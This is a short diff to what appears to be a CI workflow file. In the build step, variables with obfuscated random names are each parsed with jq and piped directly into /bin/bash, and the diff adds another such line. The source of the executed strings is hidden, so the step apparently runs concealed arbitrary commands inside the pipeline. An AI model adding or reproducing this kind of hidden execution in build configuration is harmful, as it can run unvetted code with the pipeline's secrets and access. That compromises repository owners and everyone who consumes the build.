@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$arcr91447" | jq -r .qain924 | /bin/bash
           printf '%s' "$xpae53325" | jq -r .x7292 | /bin/bash
           echo $ll0 | jq -r .o26207 | /bin/bash
+          echo $aiiow4 | jq -r .eqt3 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
